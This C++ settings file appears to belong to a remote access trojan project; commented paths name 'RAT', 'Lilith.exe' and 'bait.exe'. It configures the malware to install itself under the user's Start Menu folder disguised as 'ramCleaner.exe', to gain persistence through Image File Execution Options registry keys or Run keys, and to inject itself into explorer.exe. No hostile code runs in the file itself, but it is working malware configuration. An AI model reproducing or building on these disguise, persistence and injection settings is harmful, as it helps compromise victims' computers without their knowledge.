
#include "Settings.hpp"

//GLOBAL VARS
bool Settings::isPrivleged = "";
std::string Settings::installDirPath = "";
std::string Settings::installExePath = "";
std::string Settings::currentExePath = "";
//std::wstring Settings::regMachineStartupPath = L"";
//std::wstring Settings::regMachineRunOncePath = L"";
std::wstring Settings::regUserStartupPath = L"";
//std::wstring Settings::regUserRunOncePath = L"";
std::wstring Settings::regFileOptExecStartupPath = L"\\registry\\machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";

//SETTINGS
//D:\\D\\my\\tech\\RAT\\Qt-interface\\ratServer\\build-ratServer-Desktop_Qt_6_2_0_MSVC2019_64bit-Debug\\data\\builder\\code_DB\\src\\BotAgent\\x64\\Release\\Lilith.exe
//D:\\D\\my\\tech\\RAT\\Lilith\\x64\\Release\\bait.exe

//installation
std::string Settings::InstallEnvPath = "APPDATA";
std::string Settings::InstallEnvChildPath = "\\Microsoft\\Windows\\Start Menu\\Programs\\";
std::string Settings::InstallDirName = "ramCleaner";
std::string Settings::InstallExeName = "ramCleaner.exe";

//startup
std::string Settings::startupName = "ramCleaner";
std::string Settings::startupType = "imgExOptions"; // ex: imgExOptions/ regStartup

//injection
// ex: "ExePath.exe"/"resource/self"
//std::string Settings::PEToLoad = "D:\\D\\my\\tech\\RAT\\Lilith\\x64\\Release\\bait.exe";
std::string Settings::PEToLoad = "self";
std::string Settings::targetProcName = "explorer.exe"; // ex: "self" / "chosenProc.exe"
std::string Settings::injectionPath = "C:\\windows\\";